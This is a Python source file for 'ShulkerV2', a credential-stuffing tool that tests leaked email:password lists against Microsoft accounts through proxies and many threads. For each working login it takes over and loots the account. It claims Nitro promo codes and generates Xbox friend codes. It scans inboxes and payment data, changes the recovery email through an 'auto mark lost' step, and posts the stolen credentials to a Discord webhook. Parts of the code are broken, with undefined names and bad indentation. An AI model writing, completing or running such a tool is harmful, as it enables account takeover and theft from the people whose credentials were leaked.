#!/usr/bin/env python3
"""
ShulkerV2 - Advanced Microsoft Account Checker
Features: MC, Xbox, Hypixel, Donut, Auto Mark Lost, Nitro, Xbox Codes
"""

import os
import sys
import time
import threading
import concurrent.futures
from pathlib import Path
from datetime import datetime
from colorama import init as colorama_init, Fore, Style
import logging
import configparser
import random
from flask import config
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
# Disable warnings
requests.packages.urllib3.disable_warnings()
import re

colorama_init(autoreset=True)

# Add src to path
sys.path.insert(0, str(Path(__file__).parent))

logeer = setup_logger()

LOGO = f"""{Fore.CYAN}
███████╗██╗  ██╗██╗   ██╗██╗     ██╗  ██╗███████╗██████╗     ██╗   ██╗██████╗ 
██╔════╝██║  ██║██║   ██║██║     ██║ ██╔╝██╔════╝██╔══██╗    ██║   ██║╚════██╗
███████╗███████║██║   ██║██║     █████╔╝ █████╗  ██████╔╝    ██║   ██║ █████╔╝
╚════██║██╔══██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝ 
███████║██║  ██║╚██████╔╝███████╗██║  ██╗███████╗██║  ██║     ╚████╔╝ ███████╗
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝
                                                                                
        Advanced Microsoft Account Checker | All Features Included
{Style.RESET_ALL}"""



class CheckerEngine:
    """Main checker engine with all features"""
    
    def __init__(self, config, ui):
        self.config = config
        self.ui = ui
        
        # Stats
        self.stats = {
            'checked': 0,
            'hits': 0,
            'bad': 0,
            '2fa': 0,
            'mfa': 0,
            'sfa': 0,
            'errors': 0,
            'xgp': 0,
            'xgpu': 0,
            'normal_mc': 0,
            'hypixel_banned': 0,
            'hypixel_unbanned': 0,
            'donut_banned': 0,
            'donut_unbanned': 0,
            'nitro_claimed': 0,
            'xbox_codes': 0,
            'mark_lost_success': 0,
            'total': 0
        }
        self.stats_lock = threading.Lock()
        
        # Managers
        self.proxy_manager = ProxyManager(config)
        self.session_manager = SessionManager(config)
        
        # Discord webhook
        if config.get('discord.enabled', False):
            self.webhook = DiscordWebhook(config)
        else:
            self.webhook = None
        
        # Auto Mark Lost
        if config.get('automation.auto_mark_lost', False):
            self.auto_mark_lost = AutoMarkLost(config)
        else:
            self.auto_mark_lost = None
        
        # Control
        self.running = False
        self.executor = None
        
        # Results folders
        self.create_results_folders()
    
    def create_results_folders(self):
        """Create results folder structure"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        base = self.config.get('output.results_folder', 'results')
        self.session_folder = os.path.join(base, timestamp)
        
        folders = [
            'Hits', 'Bad', '2FA', 'MFA', 'SFA',
            'XGP', 'XGPU', 'Normal_MC',
            'Hypixel_Banned', 'Hypixel_Unbanned',
            'Donut_Banned', 'Donut_Unbanned',
            'Nitro_Claimed', 'Xbox_Codes',
            'Mark_Lost_Success', 'Capture'
        ]
        
        for folder in folders:
            os.makedirs(os.path.join(self.session_folder, folder), exist_ok=True)
        
        logger.info(f"Results: {self.session_folder}")
    
    def load_combos(self, file_path):
        """Load and deduplicate combos"""
        combos = []
        seen = set()
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or ':' not in line:
                        continue
                    
                    parts = line.split(':', 1)
                    if len(parts) != 2:
                        continue
                    
                    email = parts[0].strip().lower()
                    password = parts[1].strip()
                    
                    key = f"{email}:{password}"
                    if key not in seen:
                        seen.add(key)
                        combos.append((email, password))
            
            self.stats['total'] = len(combos)
            return combos
            
        except Exception as e:
            logger.error(f"Error loading combos: {e}")
            return []
    
    def load_proxies(self, file_path):
        """Load proxies"""
        self.proxy_manager.load_from_file(file_path)
    
    def start_checking(self, combos):
        """Start checking accounts"""
        self.running = True
        self.ui.start_checking(len(combos))
        
        threads = self.config.get('general.threads', 100)
        logger.info(f"Using {threads} threads")
        
        self.executor = ThreadPoolExecutor(max_workers=threads)
        
        # Submit tasks
        futures = []
        for email, password in combos:
            future = self.executor.submit(self.check_account, email, password)
            futures.append(future)
        
        # Process results
        for future in as_completed(futures):
            if not self.running:
                break
            try:
                future.result()
            except Exception as e:
                logger.error(f"Task error: {e}")
                with self.stats_lock:
                    self.stats['errors'] += 1
        
        self.running = False
    
    def check_account(self, email, password):
        """Check single account with ALL features"""
        session = None
        
        try:
            # Get session
            session = self.session_manager.get_session()
            
            # Apply proxy if enabled
            if self.config.get('proxies.enabled', False):
                proxy = self.proxy_manager.get_proxy()
                if proxy:
                    session.proxies = proxy
            
            # STEP 1: Microsoft Authentication
            auth = MicrosoftAuthenticator(session, self.config)
            rps_token = auth.authenticate(email, password)
            
            if not rps_token:
                # Bad account
                with self.stats_lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                
                if self.config.get('output.save_bad', False):
                    self.save_file('Bad/Bad.txt', f"{email}:{password}")
                
                return
            
            if rps_token == '2FA':
                # 2FA account
                with self.stats_lock:
                    self.stats['2fa'] += 1
                    self.stats['checked'] += 1
                
                self.save_file('2FA/2FA.txt', f"{email}:{password}")
                return
            
            # STEP 2: Security Check
            security_data = None
            if self.config.get('checkers.check_security', True):
                security_checker = SecurityChecker(session, self.config)
                security_data = security_checker.check()
            
            # STEP 3: Get Xbox tokens
            xbox_checker = XboxChecker(session, self.config)
            uhs, xsts_token = xbox_checker.get_xbox_tokens(rps_token)
            
            if not uhs or not xsts_token:
                logger.debug(f"Failed to get Xbox tokens for {email}")
                with self.stats_lock:
                    self.stats['bad'] += 1
                    self.stats['checked'] += 1
                return
            
            # STEP 4: Minecraft Check
            minecraft_data = None
            if self.config.get('checkers.check_minecraft', True):
                mc_checker = MinecraftChecker(session, self.config)
                minecraft_data = mc_checker.check(uhs, xsts_token)
            
            # STEP 5: Xbox Profile
            xbox_data = None
            if self.config.get('checkers.check_xbox', True):
                xbox_data = xbox_checker.check_profile(uhs, xsts_token)
            
            # STEP 6: Fetch Xbox Codes
            xbox_codes = []
            if self.config.get('checkers.fetch_xbox_codes', True):
                if minecraft_data and ('Game Pass' in minecraft_data.get('type', '')):
                    xbox_codes = xbox_checker.fetch_codes(uhs, xsts_token)
                    if xbox_codes:
                        with self.stats_lock:
                            self.stats['xbox_codes'] += len(xbox_codes)
            
            # STEP 7: Nitro Check
            nitro_data = None
            if self.config.get('checkers.check_nitro', True):
                if minecraft_data and ('Game Pass Ultimate' in minecraft_data.get('type', '')):
                    nitro_data = xbox_checker.check_nitro(uhs, xsts_token)
                    if nitro_data and nitro_data.get('promo_code'):
                        with self.stats_lock:
                            self.stats['nitro_claimed'] += 1
            
            # STEP 8: Hypixel Check
            hypixel_data = None
            if self.config.get('checkers.check_hypixel', True):
                if minecraft_data and minecraft_data.get('username'):
                    hypixel_checker = HypixelChecker(session, self.config)
                    hypixel_data = hypixel_checker.check(
                        minecraft_data['username'],
                        minecraft_data.get('access_token'),
                        minecraft_data.get('uuid')
                    )
            
            # STEP 9: Donut SMP Check
            donut_data = None
            if self.config.get('checkers.check_donut', True):
                if minecraft_data and minecraft_data.get('username'):
                    donut_checker = DonutChecker(session, self.config)
                    donut_data = donut_checker.check(
                        minecraft_data['username'],
                        minecraft_data.get('access_token'),
                        minecraft_data.get('uuid')
                    )
            
            # STEP 10: Microsoft Account Features
            ms_data = None
            if any([
                self.config.get('checkers.check_ms_balance'),
                self.config.get('checkers.check_ms_rewards'),
                self.config.get('checkers.check_payment_methods'),
                self.config.get('checkers.scan_inbox')
            ]):
                ms_checker = MicrosoftAccountChecker(session, self.config)
                ms_data = ms_checker.check_all(email, password)
            
            # STEP 11: Auto Mark Lost
            mark_lost_result = None
            if self.auto_mark_lost and minecraft_data:
                if minecraft_data.get('minecraft_java_owned'):
                    mark_lost_result = self.auto_mark_lost.execute(
                        email, password, minecraft_data
                    )
                    if mark_lost_result and mark_lost_result.get('success'):
                        with self.stats_lock:
                            self.stats['mark_lost_success'] += 1
            
            # Compile results
            result = {
                'email': email,
                'password': password,
                'security': security_data,
                'minecraft': minecraft_data,
                'xbox': xbox_data,
                'xbox_codes': xbox_codes,
                'nitro': nitro_data,
                'hypixel': hypixel_data,
                'donut': donut_data,
                'microsoft': ms_data,
                'mark_lost': mark_lost_result
            }
            
            # Save results
            self.save_hit(result)
            
            # Send webhook
            if self.webhook:
                self.webhook.send(result)
            
            # Update stats
            with self.stats_lock:
                self.stats['hits'] += 1
                self.stats['checked'] += 1
                
                # Count specific types
                if minecraft_data:
                    mc_type = minecraft_data.get('type', '')
                    if 'Game Pass Ultimate' in mc_type:
                        self.stats['xgpu'] += 1
                    elif 'Game Pass' in mc_type:
                        self.stats['xgp'] += 1
                    elif 'Normal' in mc_type:
                        self.stats['normal_mc'] += 1
                
                # Hypixel bans
                if hypixel_data:
                    if hypixel_data.get('banned'):
                        self.stats['hypixel_banned'] += 1
                    else:
                        self.stats['hypixel_unbanned'] += 1
                
                # Donut bans
                if donut_data:
                    if donut_data.get('banned'):
                        self.stats['donut_banned'] += 1
                    else:
                        self.stats['donut_unbanned'] += 1
                
                # Email access
                if security_data:
                    if security_data.get('has_email_access'):
                        self.stats['mfa'] += 1
                    else:
                        self.stats['sfa'] += 1
            
        except Exception as e:
            logger.error(f"Error checking {email}: {e}")
            with self.stats_lock:
                self.stats['errors'] += 1
                self.stats['checked'] += 1
        finally:
            if session:
                try:
                    session.close()
                except:
                    pass
    
    def save_hit(self, result):
        """Save hit with categorization"""
        email = result['email']
        password = result['password']
        
        # Main hits file
        hit_line = f"{email}:{password}"
        
        if result['minecraft']:
            if result['minecraft'].get('username'):
                hit_line += f" | {result['minecraft']['username']}"
            hit_line += f" | {result['minecraft'].get('type', 'Unknown')}"
        
        self.save_file('Hits/Hits.txt', hit_line)
        
        # Categorize by type
        if result['minecraft']:
            mc_type = result['minecraft'].get('type', '')
            if 'Game Pass Ultimate' in mc_type:
                self.save_file('XGPU/XGPU.txt', f"{email}:{password}")
            elif 'Game Pass' in mc_type:
                self.save_file('XGP/XGP.txt', f"{email}:{password}")
            elif 'Normal' in mc_type:
                self.save_file('Normal_MC/Normal.txt', f"{email}:{password}")
        
        # Hypixel ban status
        if result['hypixel']:
            if result['hypixel'].get('banned'):
                self.save_file('Hypixel_Banned/Banned.txt', f"{email}:{password}")
            else:
                self.save_file('Hypixel_Unbanned/Unbanned.txt', f"{email}:{password}")
        
        # Donut ban status
        if result['donut']:
            if result['donut'].get('banned'):
                self.save_file('Donut_Banned/Banned.txt', f"{email}:{password}")
            else:
                self.save_file('Donut_Unbanned/Unbanned.txt', f"{email}:{password}")
        
        # Nitro
        if result['nitro'] and result['nitro'].get('promo_code'):
            self.save_file('Nitro_Claimed/Nitro.txt', 
                f"{email}:{password} | Code: {result['nitro']['promo_code']}")
        
        # Xbox codes
        if result['xbox_codes']:
            for code in result['xbox_codes']:
                self.save_file('Xbox_Codes/Codes.txt', code)
        
        # Mark Lost
        if result['mark_lost'] and result['mark_lost'].get('success'):
            self.save_file('Mark_Lost_Success/Success.txt',
                f"{email}:{password} | New: {result['mark_lost'].get('new_recovery_email')}")
        
        # MFA/SFA
        if result['security']:
            if result['security'].get('has_email_access'):
                self.save_file('MFA/MFA.txt', f"{email}:{password}")
            else:
                self.save_file('SFA/SFA.txt', f"{email}:{password}")
        
        # Detailed capture
        self.save_capture(result)
    
    def save_file(self, filename, content):
        """Save to file"""
        filepath = os.path.join(self.session_folder, filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        
        try:
            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        except Exception as e:
            logger.error(f"Error saving to {filename}: {e}")
    
    def save_capture(self, result):
        """Save detailed capture"""
        import json
        
        capture_data = {
            'email': result['email'],
            'password': result['password'],
            'timestamp': datetime.now().isoformat(),
            'minecraft': result.get('minecraft'),
            'xbox': result.get('xbox'),
            'hypixel': result.get('hypixel'),
            'donut': result.get('donut'),
            'microsoft': result.get('microsoft'),
            'security': result.get('security'),
            'nitro': result.get('nitro'),
            'xbox_codes': result.get('xbox_codes'),
            'mark_lost': result.get('mark_lost')
        }
        
        filepath = os.path.join(self.session_folder, 'Capture', 'capture.json')
        
        try:
            # Load existing
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8') as f:
                    captures = json.load(f)
            else:
                captures = []
            
            captures.append(capture_data)
            
            # Save
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(captures, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Error saving capture: {e}")
    
    def get_stats(self):
        """Get current stats"""
        with self.stats_lock:
            return self.stats.copy()
    
    def stop(self):
        """Stop checking"""
        self.running = False
        if self.executor:
            self.executor.shutdown(wait=False)
    
    def wait_for_completion(self):
        """Wait for completion"""
        if self.executor:
            self.executor.shutdown(wait=True)

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': Fore.CYAN,
        'INFO': Fore.GREEN,
        'WARNING': Fore.YELLOW,
        'ERROR': Fore.RED,
        'CRITICAL': Fore.RED + Style.BRIGHT
    }
    
    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.levelname = f"{self.COLORS[levelname]}{levelname}{Style.RESET_ALL}"
        return super().format(record)

def setup_logger(name='shulker', level=logging.INFO):
    logger = logging.getLogger(name)
    logger.setLevel(level)
    
    if not logger.handlers:
        handler = logging.StreamHandler(sys.stdout)
        handler.setFormatter(ColoredFormatter(
            '%(asctime)s | %(levelname)s | %(message)s',
            datefmt='%H:%M:%S'
        ))
        logger.addHandler(handler)
    
    return logger

def get_logger(name='shulker'):
    return logging.getLogger(name)

class ConfigLoader:
    def __init__(self, config_file='config.ini'):
        self.config = configparser.ConfigParser()
        self.config.read(config_file, encoding='utf-8')
        self.data = {}
        self._parse_all()
    
    def _parse_all(self):
        for section in self.config.sections():
            for key, value in self.config.items(section):
                full_key = f"{section}.{key}"
                self.data[full_key] = self._parse_value(value)
    
    def _parse_value(self, value):
        value = value.strip()
        if value.lower() in ('true', 'yes', '1', 'on'):
            return True
        if value.lower() in ('false', 'no', '0', 'off'):
            return False
        try:
            if '.' in value:
                return float(value)
            return int(value)
        except ValueError:
            return value
    
    def get(self, key, default=None):
        return self.data.get(key, default)

class ProxyManager:
    def __init__(self, config):
        self.config = config
        self.proxies = []
        self.lock = threading.Lock()
        self.proxy_type = config.get('proxies.type', 'http')
    
    def load_from_file(self, file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            print(f"✓ Loaded {len(self.proxies)} proxies")
        except Exception as e:
            print(f"Error loading proxies: {e}")
    
    def get_proxy(self):
        if not self.proxies:
            return None
        
        with self.lock:
            proxy = random.choice(self.proxies)
            return self._format_proxy(proxy)
    
    def _format_proxy(self, proxy):
        # Support: ip:port, ip:port:user:pass, user:pass@ip:port
        if '@' in proxy:
            proxy_url = f"{self.proxy_type}://{proxy}"
        else:
            parts = proxy.split(':')
            if len(parts) == 4:  # ip:port:user:pass
                proxy_url = f"{self.proxy_type}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:  # ip:port
                proxy_url = f"{self.proxy_type}://{proxy}"
        
        return {'http': proxy_url, 'https': proxy_url}

class SessionManager:
    def __init__(self, config):
        self.config = config
        self.pool_size = config.get('advanced.connection_pool_size', 100)
    
    def get_session(self):
        session = requests.Session()
        
        retry = Retry(
            total=0,
            backoff_factor=0,
            status_forcelist=[]
        )
        
        adapter = HTTPAdapter(
            pool_connections=self.pool_size,
            pool_maxsize=self.pool_size,
            max_retries=retry
        )
        
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.verify = False
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        return session

class DiscordWebhook:
    def __init__(self, config):
        self.config = config
        self.webhook_url = config.get('discord.webhook_url', '')
        self.enabled = config.get('discord.enabled', False)
    
    def send(self, result):
        if not self.enabled or not self.webhook_url:
            return
        
        try:
            embed = self._create_embed(result)
            
            payload = {
                'username': self.config.get('discord.username', 'ShulkerV2'),
                'avatar_url': self.config.get('discord.avatar_url', ''),
                'embeds': [embed]
            }
            
            requests.post(self.webhook_url, json=payload, timeout=10)
        except Exception as e:
            print(f"Webhook error: {e}")
    
    def _create_embed(self, result):
        fields = []
        
        # Email and password
        fields.append({
            'name': '📧 Account',
            'value': f"```{result['email']}:{result['password']}```",
            'inline': False
        })
        
        # Minecraft
        if result.get('minecraft'):
            mc = result['minecraft']
            mc_text = f"**Type:** {mc.get('type', 'Unknown')}\n"
            if mc.get('username'):
                mc_text += f"**Username:** {mc['username']}\n"
            fields.append({'name': '🎮 Minecraft', 'value': mc_text, 'inline': True})
        
        # Hypixel
        if result.get('hypixel'):
            hyp = result['hypixel']
            hyp_text = f"**Rank:** {hyp.get('rank', 'None')}\n"
            hyp_text += f"**Level:** {hyp.get('level', 'N/A')}\n"
            hyp_text += f"**Banned:** {'Yes' if hyp.get('banned') else 'No'}"
            fields.append({'name': '⚔️ Hypixel', 'value': hyp_text, 'inline': True})
        
        # Nitro
        if result.get('nitro') and result['nitro'].get('promo_code'):
            fields.append({
                'name': '💜 Nitro',
                'value': f"```{result['nitro']['promo_code']}```",
                'inline': False
            })
        
        return {
            'title': '✅ New Hit',
            'color': int(self.config.get('discord.embed_color_hit', '#00FF00').replace('#', ''), 16),
            'fields': fields,
            'timestamp': datetime.utcnow().isoformat()
        }

class UIManager:
    def __init__(self, config):
        self.config = config
        self.stats = {}
        self.start_time = None
    
    def start_checking(self, total):
        self.start_time = time.time()
        logger.info(f"Starting check on {total} accounts")
    
    def update_loop(self):
        """Background stats update"""
        while True:
            time.sleep(5)
            # Stats update handled by checker engine
    
    def log_bad(self, email):
        logger.debug(f"Bad: {email}")
    
    def log_2fa(self, email):
        logger.info(f"2FA: {email}")
    
    def log_hit(self, result):
        logger.info(f"HIT: {result['email']}")

class MinecraftChecker:
    def __init__(self, session, config):
        self.session = session
        self.config = config
        self.timeout = config.get('general.timeout', 15)
    
    def check(self, uhs, xsts_token):
        """Check Minecraft ownership and profile"""
        # Get Minecraft access token
        mc_token = self._get_mc_token(uhs, xsts_token)
        if not mc_token:
            return None
        
        # Check ownership
        ownership = self._check_ownership(mc_token)
        if not ownership:
            return None
        
        # Get profile
        profile = self._get_profile(mc_token)
        
        return {
            **ownership,
            **profile,
            'access_token': mc_token
        }
    
    def _get_mc_token(self, uhs, xsts_token):
        """Get Minecraft access token"""
        try:
            response = self.session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                headers={'Content-Type': 'application/json'},
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                return response.json().get('access_token')
        except:
            pass
        return None
    
    def _check_ownership(self, mc_token):
        """Check Minecraft ownership"""
        try:
            response = self.session.get(
                'https://api.minecraftservices.com/entitlements/license',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=self.timeout
            )
            
            if response.status_code != 200:
                return None
            
            data = response.json()
            items = data.get('items', [])
            
            has_java = False
            has_bedrock = False
            is_gamepass = False
            
            for item in items:
                name = item.get('name', '')
                source = item.get('source', '')
                
                if name in ('game_minecraft', 'product_minecraft'):
                    if source in ('PURCHASE', 'MC_PURCHASE'):
                        has_java = True
                    elif source == 'GBP':
                        has_java = True
                        is_gamepass = True
                
                if name == 'product_minecraft_bedrock':
                    has_bedrock = True
                
                if name == 'product_game_pass_pc':
                    is_gamepass = True
                
                if name == 'product_game_pass_ultimate':
                    is_gamepass = True
            
            # Determine type
            if has_java and is_gamepass:
                mc_type = 'Xbox Game Pass Ultimate'
            elif has_java:
                mc_type = 'Normal Minecraft'
            elif is_gamepass:
                mc_type = 'Xbox Game Pass (PC)'
            else:
                return None
            
            return {
                'has_minecraft': True,
                'minecraft_java_owned': has_java,
                'minecraft_bedrock_owned': has_bedrock,
                'is_gamepass': is_gamepass,
                'type': mc_type
            }
        except:
            return None
    
    def _get_profile(self, mc_token):
        """Get Minecraft profile"""
        try:
            response = self.session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=self.timeout
            )
            
            if response.status_code != 200:
                return {}
            
            data = response.json()
            capes = [cape.get('alias', '') for cape in data.get('capes', [])]
            
            return {
                'username': data.get('name'),
                'uuid': data.get('id'),
                'capes': capes
            }
        except:
            return {}

class XboxChecker:
    def __init__(self, session, config):
        self.session = session
        self.config = config
        self.timeout = config.get('general.timeout', 15)
    
    def get_xbox_tokens(self, rps_token):
        """Get Xbox UHS and XSTS tokens"""
        try:
            # Get user token
            user_response = self.session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    'Properties': {
                        'AuthMethod': 'RPS',
                        'SiteName': 'user.auth.xboxlive.com',
                        'RpsTicket': rps_token
                    },
                    'RelyingParty': 'http://auth.xboxlive.com',
                    'TokenType': 'JWT'
                },
                headers={'Content-Type': 'application/json'},
                timeout=self.timeout
            )
            
            if user_response.status_code != 200:
                return None, None
            
            user_data = user_response.json()
            xbox_token = user_data.get('Token')
            
            # Get XSTS token
            xsts_response = self.session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    'Properties': {
                        'SandboxId': 'RETAIL',
                        'UserTokens': [xbox_token]
                    },
                    'RelyingParty': 'rp://api.minecraftservices.com/',
                    'TokenType': 'JWT'
                },
                headers={'Content-Type': 'application/json'},
                timeout=self.timeout
            )
            
            if xsts_response.status_code != 200:
                return None, None
            
            xsts_data = xsts_response.json()
            uhs = xsts_data['DisplayClaims']['xui'][0]['uhs']
            xsts_token = xsts_data.get('Token')
            
            return uhs, xsts_token
        except:
            return None, None
    
    def check_profile(self, uhs, xsts_token):
        """Get Xbox gamertag"""
        try:
            response = self.session.get(
                'https://profile.xboxlive.com/users/me/profile/settings',
                headers={
                    'Authorization': f'XBL3.0 x={uhs};{xsts_token}',
                    'x-xbl-contract-version': '3'
                },
                params={'settings': 'Gamertag'},
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                data = response.json()
                settings = data.get('profileUsers', [{}])[0].get('settings', [])
                for setting in settings:
                    if setting.get('id') == 'Gamertag':
                        return {'gamertag': setting.get('value')}
        except:
            pass
        return None
    
    def fetch_codes(self, uhs, xsts_token):
        """Fetch Xbox Game Pass friend codes"""
        codes = []
        try:
            headers = {
                'Authorization': f'XBL3.0 x={uhs};{xsts_token}',
                'Content-Type': 'application/json'
            }
            
            # Get existing offers
            response = self.session.get(
                'https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers',
                headers=headers,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                offers = response.json().get('offers', [])
                for offer in offers:
                    if not offer.get('claimed'):
                        code = offer.get('offerId')
                        if code:
                            codes.append(code)
            
            # Generate new codes if < 5
            if len(codes) < 5:
                for _ in range(3):
                    try:
                        gen_response = self.session.post(
                            'https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=US',
                            headers=headers,
                            timeout=self.timeout
                        )
                        
                        if gen_response.status_code == 200:
                            new_offers = gen_response.json().get('offers', [])
                            for offer in new_offers:
                                code = offer.get('offerId')
                                if code and code not in codes:
                                    codes.append(code)
                    except:
                        break
        except:
            pass
        
        return codes
    
    def check_nitro(self, uhs, xsts_token):
        """Check Discord Nitro perk"""
        try:
            headers = {
                'Authorization': f'XBL3.0 x={uhs};{xsts_token}',
                'Content-Type': 'application/json'
            }
            
            response = self.session.get(
                'https://profile.gamepass.com/v2/offers',
                headers=headers,
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                data = response.json()
                offers = data.get('offers', [])
                
                for offer in offers:
                    title = offer.get('title', '').lower()
                    if 'discord' in title or 'nitro' in title:
                        # Try to claim
                        offer_id = offer.get('offerId')
                        
                        claim_response = self.session.post(
                            f'https://profile.gamepass.com/v2/offers/{offer_id}/claim',
                            headers=headers,
                            timeout=self.timeout
                        )
                        
                        if claim_response.status_code == 200:
                            claim_data = claim_response.json()
                            link = claim_data.get('resource', '')
                            
                            # Extract promo code from link
                            promo_match = re.search(r'([A-Z0-9]{16,24})', link)
                            if promo_match:
                                return {
                                    'promo_code': promo_match.group(1),
                                    'redemption_link': link
                                }
        except:
            pass
        
        return None

class HypixelChecker:
    def __init__(self, session, config):
        self.session = session
        self.config = config
        self.timeout = config.get('general.timeout', 15)
    
    def check(self, username, access_token=None, uuid=None):
        """Check Hypixel stats and ban status"""
        result = {
            'rank': None,
            'level': None,
            'banned': False,
            'ban_reason': None
        }
        
        # Get stats from Plancke
        if self.config.get('checkers.check_hypixel_rank', True):
            stats = self._get_stats(username)
            if stats:
                result.update(stats)
        
        # Check ban status
        if self.config.get('checkers.check_hypixel_ban', True):
            if access_token and uuid:
                ban_status = self._check_ban(username, access_token, uuid)
                if ban_status:
                    result.update(ban_status)
        
        return result
    
    def _get_stats(self, username):
        """Get Hypixel stats from Plancke"""
        try:
            response = self.session.get(
                f'https://plancke.io/hypixel/player/stats/{username}',
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=self.timeout
            )
            
            if response.status_code != 200:
                return None
            
            text = response.text
            
            # Extract rank
            rank_match = re.search(r'<title>(.+?)\s*\|\s*Plancke</title>', text)
            rank = rank_match.group(1) if rank_match else None
            
            # Extract level
            level_match = re.search(r'Level:</b>\s*(.+?)<br', text)
            level = level_match.group(1).strip() if level_match else None
            
            return {
                'rank': rank,
                'level': level
            }
        except:
            return None
    
    def _check_ban(self, username, access_token, uuid):
        """Check Hypixel ban status via connection"""
        global errors
        if config.get('hypixelban') is True:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    if "Suspicious activity" in str(data):
                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    elif "temporarily banned" in str(data):
                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    elif "You are permanently banned from this server!" in str(data):
                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    elif "The Hypixel Alpha server is currently closed!" in str(data):
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    elif "Failed cloning your SkyBlock data" in str(data):
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                    else:
                        self.banned = ''.join(item["text"] for item in data["extra"])
                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    if self.banned == None:
                        self.banned = "False"
                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                try:
                    if len(banproxies) > 0:
                        proxy = random.choice(banproxies)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        while self.banned == None or c < 1000:
                            time.sleep(.01)
                            c+=1
                        connection.disconnect()
                    except: pass
                    sys.stderr = original_stderr
                except: pass
                if self.banned != None: break
                tries+=1

        return {'banned': False}


class DonutChecker:
    def __init__(self, session, config):
        self.session = session
        self.config = config
        self.timeout = config.get('general.timeout', 15)
    
    def check(self, username, access_token=None, uuid=None):
        """Check Donut SMP stats"""
        result = {
            'playtime': None,
            'money': None,
            'banned': False
        }
        
        try:
            response = self.session.get(
                f'https://api.donutsmp.net/v1/stats/{username}',
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=self.timeout
            )
            
            if response.status_code == 200:
                data = response.json()
                
                result['playtime'] = data.get('playtime', 0)
                result['money'] = data.get('money', 0)
                
    
                
        except:
            pass
    
        return result
    
    def join_donutsmp_bot(mc_name, mc_uuid, mc_token, combo, folder, config):
    result = None
    disconnect_message = None
    email, password = combo.split(":", 1)
    auth_token = AuthenticationToken(username=mc_name, access_token=mc_token, client_token=uuid.uuid4().hex)
    auth_token.profile = Profile(id_=mc_uuid, name=mc_name)
    try:
        connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=393, allowed_versions={393})

        @connection.listener(clientbound.login.DisconnectPacket, early=True)
        def login_disconnect(packet):
            nonlocal result, disconnect_message
            try:
                msg = str(packet.json_data)
            except Exception:
                msg = ""
            disconnect_message = msg
            result = "banned"

        @connection.listener(clientbound.play.JoinGamePacket, early=True)
        def joined_server(packet):
